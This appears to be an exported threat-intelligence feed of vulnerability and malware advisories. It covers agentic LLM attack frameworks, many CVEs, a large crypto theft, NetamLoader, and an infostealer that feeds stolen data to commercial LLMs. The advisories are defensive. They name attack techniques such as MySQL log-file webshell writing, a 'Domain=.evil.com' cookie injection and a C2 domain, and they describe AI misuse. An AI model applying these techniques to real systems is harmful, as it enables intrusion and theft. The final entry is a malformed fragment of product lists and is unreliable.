Threat actors are increasingly weaponizing agentic, LLM-driven offensive frameworks - specifically ARTEX, Hexstrike, and CAIRN - to automate multiple stages of the attack lifecycle. These tools translate high-level tactical goals into machine commands, enabling rapid execution of reconnaissance, privilege escalation, and lateral movement. Unlike human operators, these frameworks exhibit distinct forensic characteristics, such as executing complex tasks in compressed bursts (2-25 seconds) and relying on iterative trial-and-error that generates high log volumes.

## Attack Chain

1. Initial Access: Adversaries utilize compromised credentials to gain entry.
2. Reconnaissance: Agentic frameworks profile target environments (e.g., Active Directory, cloud infrastructure/AWS security groups).
3. Exploitation: Frameworks target specific services, such as Linux web servers, using exposed application-specific APIs.
4. Execution/Persistence: Automated injection of malicious files; specifically, poisoning MySQL general logs via `SET GLOBAL general_log_file` to write webshells to public directories.
5. Lateral Movement: Autonomous exploration and pivot execution between services.
6. Exfiltration: Automated staging and preparation of stolen data.

## Impact

Automated attack frameworks enable adversaries to move from initial access to deep system access in significantly reduced timeframes, with observed incidents occurring in as little as 15 minutes. The high-volume, iterative nature of agentic activity increases the speed and scale of data theft and infrastructure exploitation.

## Recommendation

- Implement control-plane isolation to prevent automated tools from harvesting cloud service credentials.
- Enforce short-lived credentials and strict least-privilege policies to limit the scope of autonomous tool activity.
- Implement network segmentation to disrupt the lateral movement paths frequently probed by automated agents.
- Deploy behavioral analytics to detect rapid, burst-like execution patterns that deviate from human-paced administrative activity.

objects.name: VStarcam O-KAM SuperIPCam: Use-after-free vulnerability (CVE-2026-120337)
objects.description: CVE-2026-120337 is a use-after-free vulnerability in VStarcam O-KAM SuperIPCam version 1.3.3.32. The vulnerability affects the function FUN_005a2d44 of SuperIPCam.exe within the P2P Session Teardown component. The vulnerability can be initiated remotely. Public exploit code has been disclosed. The vendor was contacted but did not respond.

objects.name: Zohocorp ManageEngine Eventlog Analyzer and Log360: Authenticated remote code execution (CVE-2026-8923)
objects.description:
## Overview
Zohocorp ManageEngine Eventlog Analyzer and ManageEngine Log360 versions before 13062 are vulnerable to authenticated remote code execution (RCE) via the Log Forwarding configuration option. An attacker with valid credentials can leverage this feature to execute arbitrary code on the underlying host system.

## Impact
Successful exploitation allows an authenticated user to achieve remote code execution on the server hosting the ManageEngine application, potentially leading to full system compromise.

## Recommendation
- Upgrade ManageEngine Eventlog Analyzer and ManageEngine Log360 to version 13062 or later immediately.
- Audit existing ManageEngine administrative accounts and restrict access to the Log Forwarding configuration interface to verified administrators only.
- Review historical logs for any unusual modifications to log forwarding settings or suspicious process execution spawning from the ManageEngine service account.

objects.name: Linksys E8450: Stack-based buffer overflow in portal.cgi (CVE-2026-120283)
objects.description: A vulnerability was identified in Linksys E8450 firmware version 1.2.00.360516. The issue involves the `strcpy` function in the file `/www/cgi-bin/portal.cgi`. Manipulation of the `hidden_timezone` argument leads to a stack-based buffer overflow. The attack can be executed remotely. The vendor was contacted regarding this disclosure but did not respond.

objects.name: TraderTraitor: Large-scale cryptocurrency theft targeting Binance
objects.description:
## Overview

The U.S. Federal Bureau of Investigation (FBI) has attributed a record $6.43 billion cryptocurrency theft from Binance to the North Korea-aligned threat actor TraderTraitor (also known as Jade Sleet, Pressure Chollima, PUKCHONG, Slow Pisces, and UNC4899). The threat actor is known to target individuals in the cybersecurity, AI, and blockchain industries using AI-generated personas and job-themed lures. The group leverages trojanized Terraform providers to deliver a Bash loader, which subsequently installs the FLATROOF cross-platform implant and the ROOFDECK backdoor.

## Attack Chain

1. **Reconnaissance:** The actor identifies targets in the cybersecurity, AI, and blockchain sectors.
2. **Social Engineering:** The actor poses as recruiters using AI-generated personas and industry-specific knowledge to schedule interviews via spoofed front companies.
3. **Delivery:** The target is convinced to download or interact with malicious resources, including trojanized Terraform providers.
4. **Execution:** The Terraform provider executes a Bash loader script.
5. **Staging:** The loader identifies the victim's OS and downloads the appropriate implant (FLATROOF).
6. **Persistence & Control:** The FLATROOF implant exfiltrates data and drops the ROOFDECK backdoor to establish remote command and control.
7. **Exploitation:** The actor utilizes the compromised environment to facilitate the theft and subsequent laundering of virtual assets.

## Impact

- Over $6.43 billion in virtual assets stolen from Binance, the largest cryptocurrency theft in history.
- Approximately $2.85 billion in stolen assets has been frozen on-chain by various entities including Tether, Circle, Ripple, Arbitrum, and Optimism.

## Recommendation

- Implement strict code review processes for any third-party infrastructure-as-code (IaC) modules, specifically Terraform providers.
- Audit outbound network connections from build servers and developer workstations to prevent unexpected downloads of loaders from untrusted external sources.
- Implement endpoint security monitoring to detect the execution of suspicious Bash scripts, Python information stealers, and the specific artifacts associated with FLATROOF and ROOFDECK implants.
- Review recruitment and hiring practices to verify the identity of external recruiters and the legitimacy of job opportunities offered via social media or professional networks.

objects.name: Zoho ManageEngine Password Manager Pro and PAM360 Remote Code Execution (CVE-2026-18199)
objects.description: Zohocorp ManageEngine Password Manager Pro versions before 13236 and PAM360 versions before 8601 are vulnerable to an authenticated Remote Code Execution vulnerability.

objects.name: Fastify: Path restriction bypass in @fastify/http-proxy (CVE-2026-120213)
objects.description:
## Overview

The @fastify/http-proxy plugin, versions 9.0.0 through 11.6.5, contains a path-restriction bypass vulnerability. When the plugin is configured with parameterized prefix and rewritePrefix options, it fails to correctly re-encode URL-decoded parameters before they are used in the upstream proxy path. An attacker can inject URL-encoded path separators (e.g., %2f) or query delimiters that decode into active separators on the server, allowing the proxy to direct requests to unintended upstream endpoints. This flaw enables SSRF and authorization bypass in backend services that rely on the proxy to enforce path constraints.

## Impact

The vulnerability allows unauthenticated remote attackers to reach upstream locations outside the intended prefix. Observed impacts include path-restriction bypass, server-side request forgery (SSRF), and potential authorization bypass in the proxied service.

## Recommendation

Upgrade @fastify/http-proxy to version 11.6.6 or later immediately. There are no available workarounds; patching is required to address the injection flaw.

objects.name: Fortinet FortiWeb: Unauthenticated SQL injection leading to remote code execution (CVE-2025-25257)
objects.description:
## Overview
Fortinet FortiWeb is affected by a critical vulnerability (CVE-2025-25257) that enables unauthenticated SQL injection, which can be leveraged to achieve remote code execution. Proof-of-concept exploitation code is publicly available, allowing for identification and potential compromise of unpatched systems. Patches are available in FortiWeb versions 7.0.11, 7.2.11, 7.4.8, and 7.6.4.

## Impact
Successful exploitation allows an unauthenticated, remote attacker to execute arbitrary code on the target appliance with full system impact (CVSS 9.8).

## Recommendation
- Upgrade all FortiWeb instances to the patched versions immediately: 7.0.11, 7.2.11, 7.4.8, or 7.6.4.
- Review network logs for requests to the FortiWeb appliance containing unusual SQL patterns or shell command sequences.
- Restrict access to the management interface of FortiWeb to known, trusted administrative IP addresses.

objects.name: Gitea: Archived repository metadata authorization bypass (CVE-2026-116296)
objects.description:
## Overview
Gitea repositories configured as "archived" are intended to be permanently read-only. However, due to a missing authorization check (CWE-862) in the API middleware, users with write-collaborator access can bypass these restrictions. While previous security patches (PR #39839) secured Issues and Wikis, the API routes for Milestones, Releases, and Labels remained unprotected. This vulnerability is fixed in Gitea v28.2.1.

## Impact
Users with write-collaborator privileges can tamper with historical project data, including deleting or modifying milestones and releases, which compromises the integrity of repositories intended to serve as audit-grade snapshots.

## Recommendation
- Upgrade all Gitea instances running versions <= v28.2.0 to v28.2.1 or later.
- Audit logs for API write activity on repositories marked as archived to identify potential unauthorized modifications.

objects.name: Ruijie Managed Switches: Buffer overflow in firmware upgrade interface (CVE-2026-120241)
objects.description: A vulnerability exists in the httpupg.cgi file within the Local Firmware Upgrade Interface of Ruijie RG-ES205GC, RG-ES206GC-P, RG-ES208GC, RG-ES210GC-LP, and RG-ES210GS-P (version ESW_1.0(1)B1P48). The vulnerability allows for remote buffer overflow. Public exploit code is available. The vendor did not respond to disclosure.

objects.name: NetamLoader: Multi-stage .NET injection malware targeting Windows 10
objects.description:
## Overview
NetamLoader is a sophisticated, previously undocumented .NET assembly-loading framework identified by Kaspersky. The malware targets custom Windows 10 builds (likely Windows 10 China Government Edition) used by government entities in Asia. It achieves code execution through AppDomainManager injection, hijacking the initialization process of legitimate applications. The malware was observed packaged within Windows cabinet (CAB) archives placed in system update directories, suggesting a potential supply chain compromise of trusted third-party software.

## Attack Chain
1. Delivery of a malicious CAB archive to the victim machine, specifically within 'C:\Windows\SoftwareDistribution\Download\' paths.
2. Extraction of contents into 'C:\Windows\SoftwareDistribution\Download\Install\'.
3. Execution of the legitimate process 'PatchMyPC-ScriptRunner.exe', which parses a malicious 'PatchMyPC-ScriptRunner.exe.config' file.
4. Initiation of AppDomainManager injection to load 'Microsoft.HostIntegration.Connectors.dll'.
5. Parsing of 'fabric.config' by the DLL to load the 'Resources.resx' file containing encoded and encrypted payloads.
6. Multi-stage decryption and loading of XAML and .NET modules, including XAML-2-1 for AMSI bypass.
7. Execution of XAML-3 within 'dllhost.exe' and final loading of the .NET 2 Plugin.
8. Deployment of a periodic C2 polling loop to 'openaigpt4v.com' for further payload retrieval and execution in isolated AppDomains.

## Recommendation
- Inventory systems containing Windows 10 China Government Edition or specialized government Windows builds.
- Monitor directory paths 'C:\Windows\SoftwareDistribution\Download\' for the presence of unexpected CAB archives or unauthorized file extractions into 'Install' subdirectories.
- Implement strict process execution policies for 'PatchMyPC-ScriptRunner.exe' and ensure hashes match known legitimate versions from the vendor.
- Block communication with 'openaigpt4v.com' at the network perimeter.
- Audit .NET configuration files (.config) in sensitive directories for unexpected 'AppDomainManager' settings.

objects.name: Citrix NetScaler ADC and Gateway SAML Memory Overflow (CVE-2026-107406)
objects.description: A public exploit is available for CVE-2026-107406, a critical (CVSS 9.5) unauthenticated memory overflow vulnerability (CWE-119) affecting Citrix NetScaler ADC and NetScaler Gateway. The vulnerability resides in the SAML message parser. Successful exploitation can lead to a denial of service (via service crash) or remote code execution.

objects.name: VOLTA-AUTODOXER Infostealer Leverages LLMs for Victim Data Prioritization
objects.description:
## Overview

VOLTA-AUTODOXER (aka VOLTA) is a Windows-based infostealer designed to offload data triage tasks to Large Language Models (LLMs). The malware harvests a wide array of sensitive data, including browser credentials, cookies, payment information, cryptocurrency wallet seeds, and session tokens for platforms like Discord, Telegram, and Steam. After collection, it serializes this data into an "evidence bundle" and routes it through the OpenRouter API to AI models - specifically Anthropic’s Claude, Moonshot AI’s Kimi, or Google’s Gemini - to generate a prioritized dossier on the victim, including a "WHAT THEY'RE WORTH" monetization assessment. Data exfiltration occurs in three stages via the Telegram messaging platform.

## Attack Chain

1. Initial infection and execution of the VOLTA-AUTODOXER binary on the Windows host.
2. Harvesting of local credentials, session tokens, and configuration files from web browsers, Outlook, Slack, and cloud-provider keys.
3. Enrichment of the stolen dataset by searching local Gmail caches for purchase receipts (e.g., Amazon, DoorDash, Uber Eats).
4. Serialization of the collected artifacts into a structured evidence bundle.
5. Transmission of the evidence bundle to an AI-model API (OpenRouter) using a system prompt designed to force the model into the role of a forensic intelligence analyst.
6. Exfiltration of the raw data, LLM-generated assessment, and enrichment evidence to the operator via Telegram.

## Impact

VOLTA enables operators to move beyond raw data collection to actionable, prioritized targeting. The use of AI for dossier generation provides immediate assessment of a victim's financial worth and security posture, which can significantly accelerate the effectiveness of subsequent phases like ransomware deployment or identity theft.

## Recommendation

- Monitor for unauthorized or suspicious outbound traffic to the OpenRouter API domain and Telegram API endpoints.
- Audit and restrict the use of unauthorized AI API keys or environment variables (e.g., OPENAI_API_KEY, though VOLTA uses OpenRouter, similar LLMjacking patterns apply) within enterprise environments.
- Implement endpoint detection and response (EDR) rules to monitor for common stealer behaviors: bulk file access in browser/application profiles, unusual process spawning, and connections to messaging-based C2 services.
- Enforce policies to prevent the storage of plaintext credentials or long-lived session tokens on local disk.

objects.name: AdminNeo: Cookie attribute injection via X-Forwarded-Prefix (CVE-2026-96631)
objects.description:
## Overview

AdminNeo versions 4.6.0 through 5.5.0 are vulnerable to cookie attribute injection via the `X-Forwarded-Prefix` HTTP header. The application fails to sanitize this user-supplied header before concatenating it into the `REQUEST_URI` and subsequently using it to construct `Set-Cookie` response headers. An attacker can inject arbitrary cookie attributes, such as `Domain`, `Path`, and `SameSite`, which are then parsed and executed by the victim's browser. This flaw impacts the `neo_sid` (session ID) and `neo_key` (database password encryption key) cookies. 

This issue is tracked as CVE-2026-96631.

## Impact

Successful exploitation allows for session hijacking of the `neo_sid` cookie and potential theft of the `neo_key` cookie, which is used to encrypt database credentials. An attacker can force the browser to send these cookies to an attacker-controlled domain by injecting a `Domain` attribute (e.g., `Domain=.evil.com`).

## Recommendation

- Upgrade to AdminNeo version 5.5.1 or later immediately.
- If immediate patching is not possible, modify the reverse proxy configuration to strip the `X-Forwarded-Prefix` header from client requests or force it to a static, trusted value.
- Implement a WAF rule to block HTTP requests containing semicolons or other metacharacters in the `X-Forwarded-Prefix` header.

objects.name: Prefab UI: Arbitrary code execution via Generative UI sandbox (CVE-2026-120338)
objects.description: The Prefab UI Generative UI feature utilizes a Deno subprocess to execute Pyodide-based Python code. In versions 0.14.0 through 0.20.2, this subprocess is initiated with unrestricted `--allow-read`, `--allow-write`, and `--allow-net` permissions. Because the Deno API remains available on the JavaScript global object, the Python sandbox can invoke privileged functions such as `Deno.readTextFileSync` and `Deno.writeTextFileSync`. An attacker providing code through the `generate_prefab_ui` tool can read/write files as the server OS user or achieve code execution persistence by creating `.pth` files in the server's virtual environment.

objects.name: Admin REST API: SQL injection in administrative interface (CVE-2026-2613)
objects.description:
## Overview
CVE-2026-2613 is a SQL injection vulnerability in the Admin REST API. The API fails to adequately sanitize user-supplied input before incorporating it into SQL statements. Exploitation requires administrator privileges, allowing an attacker to execute blind SQL injection attacks to infer database contents or impact database service availability.

## Impact
Successful exploitation allows for unauthorized database information disclosure and potential service disruption by manipulating SQL query structures.

## Recommendation
- Inventory systems utilizing the Admin REST API to assess exposure.
- Prioritize application-level patching or vendor-issued updates to the Admin REST API to resolve input sanitization deficiencies.
- Review and restrict administrative access, as the vulnerability requires existing administrative privileges to exploit.
- Enable database query logging to detect anomalous query structures originating from the API service account.

objects.name: XunRuiCMS: Remote code injection in Email Template Rendering (CVE-2026-120348)
objects.description: A vulnerability exists in dayrui XunRuiCMS up to 4.7.4. The function _get_tpl_content in dayrui/Fcms/Library/Notice.php (Email Template Rendering component) is susceptible to code injection. The attack can be initiated remotely. Public exploit code is available. The vendor was contacted but did not respond. The CVSS v3.1 base score is 7.3.

objects.name: Beta9: Sandbox escape via volume mount path traversal (CVE-2026-120308)
objects.description:
## Overview
A path traversal vulnerability exists in Beta9 gateway and worker components where volume identifiers are not validated for ownership or path constraints. By providing a volume identifier containing parent-directory traversal sequences, an authenticated tenant can cause the worker to bind-mount directories from the host filesystem into their sandbox. This grants read/write access to worker files and data belonging to other tenants. This vulnerability is confirmed in gateway version 0.1.769 and worker version 0.1.745.

## Impact
A tenant with a workspace token can perform unauthorized read and write operations on the underlying worker filesystem, potentially resulting in cross-tenant data exposure and host system compromise.

## Recommendation
Patch all Beta9 deployments by upgrading the gateway component to version 0.1.776 or later and the worker component to version 0.1.756 or later. These versions implement strict validation of volume identifiers and ownership checks.

objects.name: Pjsip: Heap out-of-bounds read in DNS parser (CVE-2026-32945)
objects.description:
## Overview
CVE-2026-32945 is a heap-based out-of-bounds (OOB) read vulnerability affecting Pjsip (pjproject) versions 2.16 and earlier. The flaw resides in the DNS compression pointer parsing logic within `get_name_len()` and `get_name()` in `dns.c`. An attacker can trigger a crash in any application utilizing this library (including Asterisk and FreeSWITCH) by responding to a DNS query with a crafted 20-byte packet where the compression pointer marker (0xC0) is the final byte, causing an out-of-bounds memory read.

## Impact
The vulnerability results in a remote denial-of-service (DoS) condition, crashing the Pjsip-based application. No remote code execution has been documented, but public proof-of-concept code is available to trigger the crash.

## Recommendation
- Upgrade all deployments utilizing the Pjsip library to version 2.17 or later immediately.
- Patching requires an update to the core library; ensure applications linked against `libpjproject` are recompiled or updated with the fixed library version (commit 5311aee).
- Review network configurations for VOIP infrastructure; ensure DNS resolution is restricted to trusted, internal, or hardened recursive resolvers to mitigate the risk of rogue DNS response delivery.

objects.name: Network-AI: Path traversal in InputSanitizer (CVE-2026-120313)
objects.description:
## Overview
Network-AI versions prior to 5.15.5 are susceptible to a path traversal vulnerability located in the InputSanitizer.sanitizePath() function. The vulnerability arises from an unanchored "startsWith" check used during input validation. By providing a sibling-directory path that shares a string prefix with the intended base directory, an attacker can bypass these checks to access, list, or write files outside of the configured sandbox.

## Impact
Unauthorized access allows attackers to read, list, or write files on the host filesystem that are outside of the restricted sandbox directory.

## Recommendation
- Upgrade Network-AI to version 5.15.5 or later.
- Implement strict input validation or use established path-canonicalization libraries that do not rely on unanchored prefix comparisons for path isolation.
- Audit file system access logs for operations targeting directories outside of the designated application storage path.

objects.name: WAVLINK WL-WN579A3-A: Remote OS command injection (CVE-2026-120195)
objects.description:
## Overview
A security vulnerability has been detected in WAVLINK WL-WN579A3-A firmware version 2026-03-10-94f93d4. The vulnerability is located in the `set_wzdgwMesh` function within `/cgi-bin/adm.cgi` of the Initial Setup Wizard. Manipulation of the `wlan_ssid` argument leads to OS command injection. This vulnerability can be exploited remotely. Public disclosure of the exploit has occurred. The vendor was contacted early regarding this disclosure.

## Severity
CVSS v3.1 Base Score: 10.0

objects.name: Tenable Nessus Plugin: Data Confidentiality Vulnerability (CVE-2026-119317)
objects.description:
## Overview

Tenable has released a security update to address a vulnerability in the Nessus Plugin. The flaw, tracked as CVE-2026-119317, allows an attacker to compromise the confidentiality of data processed or accessed by the plugin. Organizations using Tenable Nessus are advised to update their plugin sets to version #202610282338 or later.

## Impact

Successful exploitation of this vulnerability results in an unauthorized disclosure of information (compromise of data confidentiality). The specific nature of the exposed data depends on the configuration and environment in which the Nessus scanner is deployed.

## Recommendation

Update the Tenable Nessus Plugin set to version #202610282338 or higher immediately to mitigate the risk posed by CVE-2026-119317. Verify the plugin set version via the Nessus administration console or the Tenable vulnerability management platform.

objects.name: Order Delivery Date Pro For Woocommerce (< 12.3.1)
SUSE Linux Enterprise Server (11 SP4, 12 SP5, 15 SP4, 15 SP5, 15 SP6, 15 SP7, 16.0)
SUSE Linux Enterprise Server for SAP Applications (12 SP5, 15 SP4, 15 SP5, 15 SP6, 15 SP7, 16.0)
SUSE Linux Enterprise Real Time (15 SP4, 15 SP5, 15 SP6, 15 SP7)
SUSE Linux Enterprise High Availability Extension (15 SP4, 15 SP6, 15 SP7)
SUSE Linux Enterprise High Performance Computing (12 SP5, 15 SP4, 15 SP5)
